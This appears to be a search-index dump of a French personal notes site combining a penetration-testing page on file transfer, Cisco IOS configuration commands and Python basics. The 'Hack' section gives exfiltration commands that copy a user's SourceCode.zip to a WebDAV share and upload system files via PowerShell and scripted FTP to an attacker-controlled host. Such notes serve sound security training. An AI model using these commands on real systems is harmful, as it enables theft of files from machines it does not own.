Keep-Alive\n\nIyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo\n...SNIP...\n</code></pre> <pre><code>admin@pc[/pc]$ echo &lt;base64&gt; | base64 -d -w 0 &gt; hosts\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#telechargements-smb_1","title":"T\u00e9l\u00e9chargements SMB","text":"<p>Nous avons pr\u00e9c\u00e9demment vu que les entreprises autorisent souvent le trafic sortant \u00e0 l'aide des protocoles HTTP ( TCP / 80 ) et HTTPS ( TCP / 443 ). </p> <p>G\u00e9n\u00e9ralement, les entreprises n'autorisent pas le protocole SMB ( TCP / 445 ) hors de leur r\u00e9seau interne, car cela peut les ouvrir \u00e0 des attaques potentielles. </p> <p>Pour plus d'informations \u00e0 ce sujet, nous pouvons lire la publication Microsoft Emp\u00eacher le trafic SMB des connexions lat\u00e9rales et entrer ou quitter le r\u00e9seau.</p> <p>Une alternative consiste \u00e0 ex\u00e9cuter SMB sur HTTP avec WebDav.</p> <p>WebDAV ( RFC 4918 ) est une extension de HTTP, le protocole Internet que les navigateurs Web et les serveurs Web utilisent pour communiquer entre eux. </p> <p>Le protocole WebDAV permet \u00e0 un serveur Web de se comporter comme un serveur de fichiers, prenant en charge la cr\u00e9ation de contenu collaboratif. </p> <p>WebDAV peut \u00e9galement utiliser HTTPS.</p> <p>Lorsque vous utilisez SMB, il tentera d'abord de se connecter \u00e0 l'aide du protocole SMB, et s'il n'y a pas de part SMB disponible, il essaiera de se connecter \u00e0 l'aide du protocole HTTP. </p> <p>Dans la capture de Wireshark suivante, nous essayons de nous connecter au partage de fichiers testing3, et parce qu'il n'a rien trouv\u00e9 avec SMB, il utilise HTTP.</p> <p></p>"},{"location":"Hack/transfert%20de%20fichier/#configuration-du-serveur-webdav","title":"Configuration du serveur WebDav","text":"<p>Pour configurer notre serveur WebDav, nous devons installer deux modules Python, wsgidav et cheroot ( vous pouvez en savoir plus sur cette impl\u00e9mentation ici: wsgidav github)). </p> <p>Apr\u00e8s les avoir install\u00e9s, nous ex\u00e9cutons le wsgidav application dans le r\u00e9pertoire cible.</p>"},{"location":"Hack/transfert%20de%20fichier/#installation-des-modules-webdav-python","title":"Installation des modules WebDav Python","text":"<pre><code>admin@pc[/pc]$ sudo pip install wsgidav cheroot\n\n[sudo] password for plaintext: \nCollecting wsgidav\n  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)\n     |\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588| 171 kB 1.4 MB/s\n     ...SNIP...\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#utilisation-du-module-webdav-python","title":"Utilisation du module WebDav Python","text":"<pre><code>admin@pc[/pc]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous \n\n[sudo] password for plaintext: \nRunning without configuration file.\n10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.\n10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31\n10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)\n10:02:53.950 - INFO    : Property manager:  None\n10:02:53.950 - INFO    : Domain controller: SimpleDomainController()\n10:02:53.950 - INFO    : Registered DAV providers by route:\n10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)\n10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)\n10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.\n10:02:53.950 - WARNING : Share '/' will allow anonymous write access.\n10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.\n10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2\n10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#connexion-au-partage-webdav","title":"Connexion au partage Webdav","text":"<p>Nous pouvons maintenant essayer de nous connecter au partage en utilisant le DavWWWRoot r\u00e9pertoire.</p> <pre><code>C:\\pc&gt; dir \\\\192.168.49.128\\DavWWWRoot\n\n Volume in drive \\\\192.168.49.128\\DavWWWRoot has no label.\n Volume Serial Number is 0000-0000\n\n Directory of \\\\192.168.49.128\\DavWWWRoot\n\n05/18/2022  10:05 AM    &lt;DIR&gt;          .\n05/18/2022  10:05 AM    &lt;DIR&gt;          ..\n05/18/2022  10:05 AM    &lt;DIR&gt;          sharefolder\n05/18/2022  10:05 AM                13 filetest.txt\n               1 File(s)             13 bytes\n               3 Dir(s)  43,443,318,784 bytes free\n</code></pre> <p>Remarque: DavWWWRoot est un mot cl\u00e9 sp\u00e9cial reconnu par Windows Shell. Aucun dossier de ce type n'existe sur votre serveur WebDAV. Le mot cl\u00e9 DavWWRoot indique au pilote Mini-Redirector, qui g\u00e8re les demandes WebDAV que vous vous connectez \u00e0 la racine du serveur WebDAV.</p> <p>Vous pouvez \u00e9viter d'utiliser ce mot-cl\u00e9 si vous sp\u00e9cifiez un dossier qui existe sur votre serveur lors de la connexion au serveur. Par exemple: \\ 192.168.49.128 \\ sharefolder</p>"},{"location":"Hack/transfert%20de%20fichier/#telechargement-de-fichiers-a-laide-de-smb","title":"T\u00e9l\u00e9chargement de fichiers \u00e0 l'aide de SMB","text":"<pre><code>C:\\pc&gt; copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\DavWWWRoot\\\nC:\\pc&gt; copy C:\\Users\\john\\Desktop\\SourceCode.zip \\\\192.168.49.129\\sharefolder\\\n</code></pre> <p>Remarque: S'il n'y a pas de restrictions SMB ( TCP / 445 ), vous pouvez utiliser impacket-smbserver de la m\u00eame mani\u00e8re que nous l'avons configur\u00e9 pour les op\u00e9rations de t\u00e9l\u00e9chargement.</p>"},{"location":"Hack/transfert%20de%20fichier/#telechargements-ftp_1","title":"T\u00e9l\u00e9chargements FTP","text":"<p>Le t\u00e9l\u00e9chargement de fichiers \u00e0 l'aide de FTP est tr\u00e8s similaire au t\u00e9l\u00e9chargement de fichiers. </p> <p>Nous pouvons utiliser PowerShell ou le client FTP pour executer l'op\u00e9ration. </p> <p>Avant de d\u00e9marrer notre serveur FTP \u00e0 l'aide du module Python pyftpdlib, nous devons sp\u00e9cifier l'option --write pour permettre aux clients de t\u00e9l\u00e9charger des fichiers sur notre h\u00f4te d'attaque.</p> <pre><code>admin@pc[/pc]$ sudo python3 -m pyftpdlib --port 21 --write\n\n/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.\n  warnings.warn(\"write permissions assigned to anonymous user.\",\n[I 2022-05-18 10:33:31] concurrency model: async\n[I 2022-05-18 10:33:31] masquerade (NAT) address: None\n[I 2022-05-18 10:33:31] passive ports: None\n[I 2022-05-18 10:33:31] &gt;&gt;&gt; starting FTP server on 0.0.0.0:21, pid=5155 &lt;&lt;&lt;\n</code></pre> <p>Utilisons maintenant la fonction de t\u00e9l\u00e9chargement PowerShell pour t\u00e9l\u00e9charger un fichier sur notre serveur FTP.</p>"},{"location":"Hack/transfert%20de%20fichier/#fichier-de-telechargement-powershell","title":"Fichier de t\u00e9l\u00e9chargement PowerShell","text":"<pre><code>PS C:\\pc&gt; (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\\Windows\\System32\\drivers\\etc\\hosts')\n</code></pre>"},{"location":"Hack/transfert%20de%20fichier/#creer-un-fichier-de-commande-pour-le-client-ftp-pour-telecharger-un-fichier","title":"Cr\u00e9er un fichier de commande pour le client FTP pour t\u00e9l\u00e9charger un fichier","text":"<pre><code>C:\\pc&gt; echo open 192.168.49.128 &gt; ftpcommand.txt\nC:\\pc&gt; echo USER anonymous &gt;&gt; ftpcommand.txt\nC:\\pc&gt; echo binary &gt;&gt; ftpcommand.txt\nC:\\pc&gt; echo PUT c:\\windows\\system32\\drivers\\etc\\hosts &gt;&gt; ftpcommand.txt\nC:\\pc&gt; echo bye &gt;&gt; ftpcommand.txt\nC:\\pc&gt; ftp -v -n -s:ftpcommand.txt\nftp&gt; open 192.168.49.128\n\nLog in with USER and PASS first.\n\n\nftp&gt; USER anonymous\nftp&gt; PUT c:\\windows\\system32\\drivers\\etc\\hosts\nftp&gt; bye\n</code></pre>"},{"location":"IOS/commande_ios/","title":"Commande ios","text":""},{"location":"IOS/commande_ios/#commande-de-base","title":"Commande de base","text":"<pre><code>!--- commentaire                                    # commentaire cisco \nrouter&gt;?                                            # aide\nrouter&gt;                                             # utilisateur\nrouter&gt; enable                                      # acc\u00e8s root\nrouter# configuration                               # acces configuration globale\nrouter&gt;exit ou end                                  # retour en arri\u00e8re\nrouter(config)#ip domain-name CCNA.com              # chang\u00e9 nom de domaine (sensible \u00e0 la casse pour la notation dans PT)\nrouter(config)# no ip domain-lookup                 # d\u00e9sactiver la recherche dns \nshow run | include default-gateway                  # afficher gateway \n\n!--- Rename le nom du switch ou server \nrouter(config)#hostname (hostname)                  # assigner un hostname\nrouter(config)#no hostname (hostname)               # supprimer le hostname\n\n!--- Mot de passe et ssh \nrouter(config)#username any_user secret any_password # creer user et mot de passe pour ssh \nrouter(config)#service password-encryption          # Crypter tous les mots de passe en clair    \nrouter(config)#security password min-length 10      # D\u00e9finissez la longueur minimale du mot de passe sur 10\n</code></pre>"},{"location":"IOS/commande_ios/#configurer-le-mot-de-passe-de-console-ainsi-que-celui-du-mode-dexecution-privilegie","title":"Configurer le mot de passe de console ainsi que celui du mode d'ex\u00e9cution privil\u00e9gi\u00e9.","text":"<pre><code>router(config)# line console 0                      \nrouter(config-line)# password \"cisco\"               # Attribuez \"cisco\" comme mot de passe de console, puis \nrouter(config-line)# login                          # activez la connexion\nrouter(config-line)# exit\nrouter(config)# enable secret \"class\"        # Utilisez \"class\" comme mot de passe pour le mode d'ex\u00e9cution privil\u00e9gi\u00e9 chiffr\u00e9.\n</code></pre>"},{"location":"IOS/commande_ios/#commande-show","title":"Commande show","text":"<pre><code>router(config)#show vlan [brief | id vlan-id | name vlan-name | summary]\n\nrouter(config)#show running configuration       # affiche la config du routeur \n\nrouter(config)#show arp                         # protocole r\u00e9solution d'adresse\nProtocol  Address          Age (min)  Hardware Addr   Type   Interface\nInternet  209.165.201.1           -   0060.70B4.A601  ARPA   GigabitEthernet0/0\n\nrouter(config)#show flash                       # mem flash \nrouter(config)#show ip route                    # route \nrouter(config)#show interface                   # interface\nrouter(config)#show version                     # version\nrouter(config)#show ?                           # aide\n\n\n</code></pre>"},{"location":"IOS/commande_ios/#configurer-une-banniere-motd-message-of-the-day-ou-message-du-jour","title":"Configurer une banni\u00e8re MOTD (message of the day, ou message du jour)","text":"<p>Dans cette \u00e9tape, vous allez configurer une banni\u00e8re MOTD pour afficher un avertissement d'acc\u00e8s non autoris\u00e9. Voici un exemple de texte : - Acc\u00e8s autoris\u00e9 uniquement.</p> <p>Utilisez la commande banner motd avec le message exemple. Vous pouvez choisir un autre message.</p> <pre><code>router(config)# banner motd \"Acc\u00e8s autoris\u00e9 uniquement.\"\n</code></pre>"},{"location":"IOS/commande_ios/#enregistrer-le-fichier-de-config","title":"Enregistrer le fichier de config","text":"<pre><code>router(config)#exit                             # quitter le mode root \nrouter&gt;copy running-config startup-config\nrouter&gt;wr \n</code></pre>"},{"location":"IOS/commande_ios/#enregistrer-sur-la-memoire-flash","title":"Enregistrer sur la m\u00e9moire flash","text":"<p>Sachez qu'en guise de proc\u00e9dure de sauvegarde suppl\u00e9mentaire, vous pouvez enregistrer votre fichier de configuration initiale dans la m\u00e9moire Flash. Par d\u00e9faut, le routeur continue \u00e0 charger la configuration initiale \u00e0 partir de la m\u00e9moire NVRAM, mais si cette m\u00e9moire est endommag\u00e9e, vous pouvez restaurer la configuration initiale en la copiant \u00e0 partir de la m\u00e9moire Flash.</p> <pre><code>router(config)#copy startup-config flash \nrouter(config)#copy startup-config flash\n</code></pre>"},{"location":"IOS/commande_ios/#configuration-de-port-et-ip-commande-switchport","title":"Configuration de port et ip ( Commande switchport )","text":""},{"location":"IOS/commande_ios/#configurez-un-port-securise","title":"Configurez un port s\u00e9curis\u00e9","text":"<p>Acc\u00e9dez \u00e0 la ligne de commande pour server et activez la s\u00e9curit\u00e9 des ports sur les ports Fast Ethernet 0/1 et 0/2.</p> <p>server(config)# interface range fa0/1 - 2</p> <p>server(config-if-range)# switchport port-security</p> <p>D\u00e9finissez le maximum afin qu'un seul appareil puisse acc\u00e9der aux ports Fast Ethernet 0/1 et 0/2.</p> <p>server(config-if-range)# switchport port-security maximum 1</p> <p>S\u00e9curisez les ports afin que l'adresse MAC d'un p\u00e9riph\u00e9rique soit dynamiquement apprise et ajout\u00e9e au r\u00e9seau en cours d'ex\u00e9cution. configuration.</p> <p>server(config-if-range)# switchport port-security mac-address sticky</p> <p>D\u00e9finissez la violation de sorte que les ports Fast Ethernet 0/1 et 0/2 ne soient pas d\u00e9sactiv\u00e9s lorsqu'une violation se produit, mais une notification de la violation de s\u00e9curit\u00e9 est g\u00e9n\u00e9r\u00e9e et les paquets provenant de la source inconnue sont supprim\u00e9s.</p> <p>server(config-if-range)# switchport port-security violation restrict</p> <p>D\u00e9sactivez tous les ports inutilis\u00e9s restants. Astuce : utilisez le mot-cl\u00e9 range pour appliquer cette configuration \u00e0 tous les ports simultan\u00e9ment.</p> <p>server(config-if-range)# interface range fa0/3 - 24 , gi0/1 - 2</p> <p>server(config-if-range)# shutdown</p>"},{"location":"IOS/commande_ios/#mode-de-port-securise","title":"mode de port s\u00e9curis\u00e9","text":"<p>(config-if)#switchport port-security violation {protect | restrict | shutdown}</p> <ul> <li>Mode protect : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port arr\u00eate de transf\u00e9rer le trafic des adresses non autoris\u00e9es sans envoyer de message de log.</li> <li>Mode restrict : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port arr\u00eate de transf\u00e9rer le trafic des adresses non autoris\u00e9es et transmet un message de log.</li> <li>Mode shutdown : d\u00e8s que la \u201cviolation\u201d est constat\u00e9e, le port passe en \u00e9tat err-disabled (shutdown) et un message de log est envoy\u00e9.</li> </ul>"},{"location":"IOS/commande_ios/#desactiver-tous-les-ports-de-commutateur-inutilises","title":"D\u00e9sactiver tous les ports de commutateur inutilis\u00e9s","text":"<p>non utilis\u00e9 f0/2 jusqua f0/24 et g0/2</p> <pre><code>SW1(config)# interface range F0/2-24, G0/2\nSW1(config-if-range)# shutdown\n</code></pre>"},{"location":"IOS/commande_ios/#configurer-lip-et-adress-mask-gateway","title":"Configurer l'ip et adress mask gateway","text":"<pre><code>router(config)#interface vlan 1\nrouter(config)# ip address 192.168.1.253 255.255.255.0\nrouter(config)# no shutdown                         #enable interface\nrouter(config)# exit\nrouter# show ip interface brief                     # v\u00e9rifier changement effectuer \n\n\nrouter(config)#ip default-gateway address           # configurer gateway par default \nrouter(config)#no default-gateway address\n</code></pre>"},{"location":"IOS/commande_ios/#vlan-trunk-ssh","title":"Vlan trunk ssh","text":""},{"location":"IOS/commande_ios/#creer-et-nommer-des-vlans","title":"Cr\u00e9er et nommer des vlans","text":"<pre><code>router(config)#vlan 10\nrouter(config-vlan)# name (namevlan10)\nrouter(config)#vlan 15\nrouter(config-vlan)# name (namevlan15)\n</code></pre>"},{"location":"IOS/commande_ios/#assignez-des-vlans-a-un-port-actif","title":"Assignez des vlans a un port actif","text":"<pre><code>router(config)# interface f0/11\nrouter(config-if)# switchport mode access\nrouter(config-if)# switchport access vlan 10\nrouter(config-if)# switchport access vlan 15\n</code></pre>"},{"location":"IOS/commande_ios/#assignez-le-voice-vlan-a-un-port-actif","title":"Assignez le voice vlan a un port actif","text":"<pre><code>router(config)# interface f0/11\nrouter(config-if)# mls qos trust cos\nrouter(config-if)# switchport voice vlan 150  # vlan 150 \n</code></pre>"},{"location":"IOS/commande_ios/#configure-trunks","title":"Configure trunks","text":"<p>Un trunk est une liaison point \u00e0 point entre deux p\u00e9riph\u00e9riques  r\u00e9seau.</p> <p>Fonctions du trunk : \u2022 Autoriser plusieurs VLAN sur un port \u2022 \u00c9tendre le VLAN sur l'ensemble du r\u00e9seau</p> <pre><code>!--- Configurer G0/1 et G0/2 interfaces sur Server pour trunk.\nrouter(config)# interface range g0/1 - 2\nrouter(config-if)# switchport mode trunk\n!--- Configure VLAN 99 as the native VLAN for G0/1 and G0/2 interfaces on S1.\nrouter(config-if)# switchport trunk native vlan 99\n</code></pre>"},{"location":"IOS/commande_ios/#ssh","title":"SSH","text":"<p>D\u00e9sactivez la recherche DNS.</p> <p>server(config)# no ip domain-lookup</p> <p>Choisir un nom de domaine </p> <p>router(config)# ip domain-name CCNA.com</p> <p>creer un user de son choix avec un mot de passe s\u00e9curis\u00e9 </p> <p>router(config)# username any_user secret any_password</p> <p>Generer 1024-bit RSA keys.</p> <p>router(config)# crypto key generate rsa</p> <p>How many bits in the modulus [512]: 1024</p> <p>Bloquez pendant trois minutes toute personne qui ne parvient pas \u00e0 se connecter apr\u00e8s quatre tentatives sur une p\u00e9riode de deux minutes.      </p> <p>router(config)# login block-for 180 attempts 4 within 120</p> <p>Configurez toutes les lignes VTY pour l'acc\u00e8s SSH et utilisez les profils d'utilisateurs locaux pour l'authentification.</p> <p>router(config)# line vty 0 4</p> <p>router(config-line)# transport input ssh</p> <p>router(config-line)# login local</p> <p>R\u00e9glez le d\u00e9lai d'attente du mode EXEC sur 6 minutes sur les lignes VTY.</p> <p>router(config-line)# exec-timeout 6</p> <p>Et sauvegarder </p>"},{"location":"Python3/python/","title":"python","text":"<ul> <li>var = entier,decimal,caract\u00e8re (int,float,string)</li> <li>\\n  saut\u00e9 une ligne dans string ou print</li> <li>liste = ['salut' , '\u00e7a' , 'va']</li> <li>print(liste[0:3]) print(*liste)  </li> </ul> Op\u00e9rateur Nom + Addition \u2013 Soustraction * Multiplication / Division % Modulo ** Puissance // Division enti\u00e8re x = 3 print:3 -= x -=3 print:0 soustraction /= x /=3 print:1 division *= x *= 3 print:12 multiplication += x += 3 print:6 addition := != true ou false non egal == true ou false egal &lt;&gt; true ou false plus grand ou plus petit &lt;= &gt;= true false plus petit, grand et \u00e9gal <pre><code>print(num:=int(input()))  # creer une variable  \nraw_input('tapez ip: ')  # valeur entr\u00e9 au clavier \ninput() # idem au dessus mais pour python3\n\nint() deviens une valeur entier example int(raw_input('3'))\n</code></pre> <pre><code>print(\"\"\"texte\nsur\nplusieurs\nlignes\"\"\")\n</code></pre> <pre><code>&gt;&gt;&gt; x = 3\n&gt;&gt;&gt; print \"x vaut : \" + str(x) \nx vaut : 3\n# x etant un entier il ne peu pas s'additionner a une chaine de caract\u00e8re \n\n&gt;&gt;&gt; x = 3.125\n&gt;&gt;&gt; print \"x vaut : \" + str(float(x))\nx vaut : 3.125\n&gt;&gt;&gt; print \" x vaut : \" + str(int(x))\nx vaut : 3\n\n</code></pre>"},{"location":"Python3/python/#fonction","title":"fonction","text":"<pre><code>input()     # entr\u00e9e au clavier \n\nprint()     # afficher \n\nint('')     # nombre entier : 3\n\nfloat('')   # nombre decimal : 3.254\n\nstr('')     # chaine de caract\u00e8re \n\n.upper()    # majuscule x = text.upper()\n\n.lower()    # minuscule x = text.lower()\n\n.capitalize() # majuscule premi\u00e8re lettre \n\nlen()       # compte len(\"salut\") retourne 5\n\n.pop()      # supprime un \u00e9l\u00e9ment de liste \n                liste.pop(1)\n.append()   # ajoute a la fin d'une liste \n\n.insert(2,'') # ajoute a la place donn\u00e9  \n\ndef fonct():  # cr\u00e9e sa fonction\n    return\n</code></pre>"},{"location":"Python3/python/#if","title":"if","text":"<pre><code>if 10 &gt; 5:          # attention aux deux points \n    print(\"10 greater than 5\")\n\nprint(\"Program ended\")\n\n</code></pre>"},{"location":"Python3/python/#else","title":"else","text":"<pre><code>x = 4\nif x == 5:\n    print(\"Yes\")\nelse:\n    print(\"No\")\n\n</code></pre>"},{"location":"Python3/python/#elif","title":"elif","text":"<pre><code>num = 3\nif num == 1:\n    print(\"One\")\nelif num == 2:\n    print(\"Two\")\nelif num == 3: \n    print(\"Three\")\nelse: \n    print(\"Something else\")\n\n</code></pre>"},{"location":"Python3/python/#and-et-or","title":"and et or","text":"<pre><code>\ntemperature = 35\n\nif temperature &gt; 18 and temperature &lt; 22:       # temp supp a 18 et inf a 22\n    print('il fais bon')\n\nif temperature &gt; 18 or temperature == 22:       # temp supp a 18 ou \u00e9gal (boll\u00e9en)\n    print('test')\n</code></pre>"},{"location":"Python3/python/#not","title":"not","text":"<pre><code>\nprint(not 1 == 1)\nfalse\nprint(not 1 &gt; 7)\ntrue\n\n</code></pre>"},{"location":"Python3/python/#boucle","title":"Boucle","text":""},{"location":"Python3/python/#for-in","title":"for in","text":"<pre><code>for _ in range(): # nombre ou variable\na = 1\nb = 1\nfor loop in range(20):\n    for loop in range(20):\n        print(a * b, end=' ')\n        b = b + 1\n    a = a+ 1\n    b = 1\n    print()\n</code></pre>"},{"location":"Python3/python/#while","title":"while","text":"<pre><code>a=1\nwhile a &lt; 10:\n    print(a)\n    a = a + 1\n</code></pre>"}]}